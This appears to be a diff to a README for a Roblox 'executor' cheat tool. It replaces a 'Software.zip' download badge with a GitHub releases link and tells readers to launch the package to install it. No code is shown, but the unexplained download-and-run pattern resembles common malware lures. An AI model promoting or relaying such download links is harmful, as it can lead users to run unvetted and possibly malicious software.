@@ -18,7 +18,7 @@ Roblox Moon Executor is a state-of-the-art tool designed for Roblox enthusiasts 
 
 To install the Roblox Moon Executor, download the software package from the following link:
 
-[![Download Moon Executor](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Moon Executor](https://github.com/timy2002/Roblox-Moon/releases/tag/v2.0)](https://github.com/timy2002/Roblox-Moon/releases/tag/v2.0)
 
 Please note that the software package needs to be launched for installation.
 
